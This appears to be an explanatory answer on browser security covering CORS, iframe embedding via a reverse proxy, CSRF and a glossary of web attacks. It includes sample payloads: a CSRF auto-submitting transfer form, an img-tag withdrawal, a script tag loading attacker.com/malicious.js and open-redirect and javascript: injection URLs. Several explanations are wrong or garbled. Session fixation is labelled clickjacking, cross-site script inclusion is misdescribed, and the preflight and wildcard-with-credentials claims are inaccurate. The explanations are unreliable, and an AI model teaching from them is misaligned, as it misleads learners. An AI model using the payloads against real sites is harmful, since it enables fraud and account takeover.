# Web Browser Attacks and Security Policies

## (a) CORS — Cross-Origin Resource Sharing

### What is CORS?

CORS is a browser security mechanism that restricts how a web page loaded from one origin can make HTTP requests to a different origin. An "origin" in this context is defined by the combination of **scheme (protocol)**, **hostname**, and **port** — all three must match for two URLs to share the same origin.

When a browser detects that a request is cross-origin (e.g., your page on `example.com` trying to fetch data from `api.example.org`), it checks whether the target server has explicitly allowed that origin by including the appropriate CORS headers:

- `Access-Control-Allow-Origin` — specifies which origins are permitted
- `Access-Control-Allow-Credentials` — permits cookies to be sent cross-origin
- `Access-Control-Expose-Headers` — allows the browser to read certain response headers from JavaScript

### Why CORS breaks iframe embedding without a reverse proxy

When you embed an iframe pointing to a different origin (e.g., your banking site), the parent page and the iframe are on different origins. This means:

1. **JavaScript cannot access the iframe's DOM** — The parent page is blocked by the Same-Origin Policy from reading or manipulating content inside the cross-origin iframe. You'll see errors like `SecurityError: Blocked a frame with origin from accessing a cross-origin frame`.

2. **Cross-origin requests within the iframe are also restricted** — If the iframe itself tries to make AJAX/Fetch/XHR requests to its own origin, CORS headers on that server determine whether those requests succeed when initiated from JavaScript inside the iframe (e.g., if the iframe content is a page from a third-party API).

3. **The browser's "clickjacking" prevention** — Many banks also use `X-Frame-Options` or Content-Security-Policy `frame-ancestors` headers to prevent their pages from being embedded in iframes at all, regardless of CORS.

### How a reverse proxy fixes this

A reverse proxy (such as Nginx acting as a reverse proxy) solves these issues by **making the iframe appear same-origin**. The proxy sits in front of the bank and proxies requests on behalf of your application:

- Your page loads at `yourapp.example.com`
- Instead of embedding `https://bank.com`, you embed `/proxy/bank/` — which goes through your own reverse proxy
- The reverse proxy forwards the request to `https://bank.com`, strips or adds CORS headers, and returns the response under `yourapp.example.com/proxy/bank/`

Because both the parent page and the iframe content are served from `yourapp.example.com`, they share the same origin. JavaScript can now access the iframe's DOM without cross-origin errors. This is why reverse proxies are commonly used in applications that embed third-party pages (e.g., banking dashboards, payment portals).

---

## (b) Can an attacker bypass CORS by hosting a malicious page in the top-level window with an iframe pointing to your bank?

### The answer: No, this does not work — for several reasons.

An attacker **cannot** circumvent CORS simply by serving a hacked website in the top-level window and embedding a cross-origin iframe of your banking site. Here's why:

#### 1. CORS is about requests, not iframes

CORS restricts **JavaScript-initiated HTTP requests** from one origin to another. When an attacker places an iframe pointing to `bank.com` inside their malicious page at `attacker.com`, the CORS policy does **not** prevent the iframe from loading and displaying bank content in a normal browsing scenario. However, it does prevent the attacker's JavaScript from **reading or manipulating** the iframe's content (the Same-Origin Policy applies here).

The key point: CORS doesn't stop the iframe from *showing* the bank page — it stops the attacker's scripts from *accessing* what's inside it.

#### 2. The Same-Origin Policy blocks DOM access

Even if the iframe loads, the attacker cannot read the iframe's DOM to steal account data, capture session tokens, or observe user actions. This is enforced by the browser at the JavaScript level, not by CORS headers on the bank's servers. Attempting to do so triggers a `SecurityError`.

#### 3. Banks actively prevent iframe embedding via X-Frame-Options and CSP

Most banking sites include:

```
X-Frame-Options: DENY or SAMEORIGIN
Content-Security-Policy: frame-ancestors 'none'
```

These headers tell the browser to **refuse to render the page inside an iframe at all**. When a user navigates from the attacker's site to try loading the bank in an iframe, the browser will instead display a blank page or an error — effectively blocking the attack. This is a different mechanism from CORS; it works at the HTTP response header level rather than the request level.

#### 4. Certificate validation is not the primary barrier here

Your question about private certificates and URL imitation touches on HTTPS/TLS, which is a separate (but related) concern:

- An attacker cannot impersonate `bank.com` via HTTPS because they don't possess the bank's private key. The browser will reject any certificate that claims to be for `bank.com` unless it was issued by a trusted Certificate Authority to the bank.
- This means the attacker **cannot** serve a fake `bank.com` at their own domain and have the browser treat it as the real bank. TLS binds the certificate to the hostname.

However, note that even if the attacker *could* somehow serve an HTTPS page that looks like the bank (e.g., via DNS poisoning or a compromised CA), CORS wouldn't matter — they'd already be serving the bank's content directly and could execute their own JavaScript. The real attacks in that scenario would be **phishing** (tricking users into entering credentials) rather than cross-origin script exploits.

#### Summary

CORS is not designed to prevent iframes from loading across origins — it prevents scripts from reading data across origins. An iframe of a bank site *can* load in an attacker's page, but the attacker's JavaScript cannot interact with its content. Additionally, banks explicitly block iframe embedding via `X-Frame-Options` and CSP headers, which is the primary defense against this scenario.

---

## (c) CSRF — Cross-Site Request Forgery

### What is CSRF?

CSRF is an attack where a malicious site tricks your browser into making an **unintended request** to a trusted site (such as your bank) where you're already authenticated. The key elements:

1. You are logged in at `bank.com` and have an active session (e.g., a `JSESSIONID` cookie).
2. An attacker's malicious page (at `attacker.com`) contains a mechanism to force a request to `bank.com`.
3. When you visit the attacker's site, your browser automatically sends the `JSESSIONID` cookie along with any cross-origin requests — **without requiring any JavaScript**. This is because cookies are sent with *all* requests to that domain, regardless of which origin initiated them.

### How CSRF works in practice

The attacker can force a request through several methods:

- **Hidden form submission**: A form that auto-submits via JavaScript:
  ```html
  <form action="https://bank.com/transfer" method="POST">
      <input type="hidden" name="account" value="attacker_account">
      <input type="hidden" name="amount" value="5000">
      <button type="submit"></button>
  </form>
  <script>document.forms[0].submit();</script>
  ```

- **Image tag trick**: An attacker forces a GET request:
  ```html
  <img src="https://bank.com/withdraw?amount=100&to=attacker">
  ```

- **XMLHttpRequest / Fetch from within an iframe**: A compromised or malicious iframe can trigger cross-origin requests to the bank.

### Why CSRF is dangerous

The request reaches the bank server, which sees a valid `JSESSIONID` cookie and assumes it comes from you. The bank processes the action (e.g., transferring funds) as if you authorized it — because the cookie proves your session was active. The attack doesn't require reading any data; it only requires **writing** to the bank with your credentials already attached.

### CSRF protections

Modern banks defend against CSRF using several mechanisms:

- **CSRF tokens**: A unique, unpredictable token embedded in every form and required with each request. The attacker cannot guess this token because they cannot read the page content from another origin (Same-Origin Policy).
- **Custom headers on XHR requests**: CORS preflight checks require `preflight` for custom headers like `X-CSRF-Token`, which attackers cannot set.
- **SameSite cookie attribute**: Setting cookies as `SameSite=Strict` or `SameSite=Lax` prevents the browser from sending session cookies with cross-origin requests entirely.

---

## (d) Other Well-Known Web Security Terms and Concepts

Here's a list of other important security terms beyond CORS and CSRF:

### 1. XSS — Cross-Site Scripting
An attack where an attacker injects malicious JavaScript into a web page viewed by other users. If the site doesn't properly sanitize user input, the script executes in the victim's browser with full access to their session cookies, DOM, and ability to act on their behalf.

### 2. Clickjacking (UI Redress Attack)
An attack where a malicious page overlays an invisible iframe of a target site on top of its own UI, tricking the user into clicking something they didn't intend to click — for example, clicking a "delete" button hidden inside the invisible iframe while thinking they're clicking a benign link. Defense: `X-Frame-Options` or `frame-ancestors` CSP directive.

### 3. Data Injection — Cross-Site Script Inclusion
An attack where an attacker tricks a target site into fetching and executing their malicious JavaScript via a script tag:
```html
<script src="https://attacker.com/malicious.js"></script>
```
If the target site loads this script (e.g., as a third-party widget), it executes in the target's origin with full access to its cookies and DOM.

### 4. Clickjacking — Session Fixation
An attack where an attacker tricks a user into creating a new session at a target site while the attacker already knows or controls that session ID. The attacker then uses their known session ID to hijack the victim's authenticated session.

### 5. Open Redirect
When a site accepts a URL parameter and redirects users to it without validation, an attacker can craft links like:
```
https://trusted-site.com/login?redirect=https://attacker.com/phishing
```
This is often used in phishing campaigns to make malicious links appear to originate from a trusted domain.

### 6. Content-Security-Policy (CSP)
A browser-enforced security header that defines which sources of content (scripts, styles, images, etc.) are allowed to load on a page. A strong CSP can mitigate XSS by restricting inline script execution and limiting where JavaScript can be loaded from:
```
Content-Security-Policy: default-src 'self'; script-src 'self' trusted-cdn.com;
```

### 7. HTTP Strict Transport Security (HSTS)
A header that forces browsers to only connect to a site over HTTPS for a specified period, preventing downgrade attacks and cookie hijacking via man-in-the-middle.

### 8. Subresource Integrity (SRI)
A mechanism that ensures third-party resources (e.g., CDN-loaded libraries) haven't been tampered with by including a cryptographic hash in the script tag:
```html
<script src="https://cdn.example.com/jquery.js"
        integrity="sha384-abc123def...">
</script>
```

### 9. Cookie Flooding / Cookie Bombing
An attack where an attacker sets a massive number of cookies on their domain (or a subdomain), approaching the browser's cookie limit per domain (typically around 50). If the target site uses subdomain cookies, this can exhaust space and prevent legitimate session cookies from being stored.

### 10. Protocol Injection
An attack where user-controlled input is inserted into a URL scheme or protocol string, potentially allowing an attacker to execute arbitrary HTML/JavaScript:
```
https://site.com/page?url=javascript:alert('XSS')
```

### 11. Beacon-based Data Exfiltration
A technique where malicious JavaScript silently sends stolen data (e.g., cookies, form contents) to the attacker's server using `navigator.sendBeacon()`, `Image` objects, or XHR requests — all without user knowledge or interaction.

### 12. CORS Misconfiguration
While CORS is a protective mechanism, it can be misconfigured by allowing overly broad origins (`Access-Control-Allow-Origin: *`) with credentials enabled, effectively neutralizing its protections and opening the site to CSRF and data theft attacks.
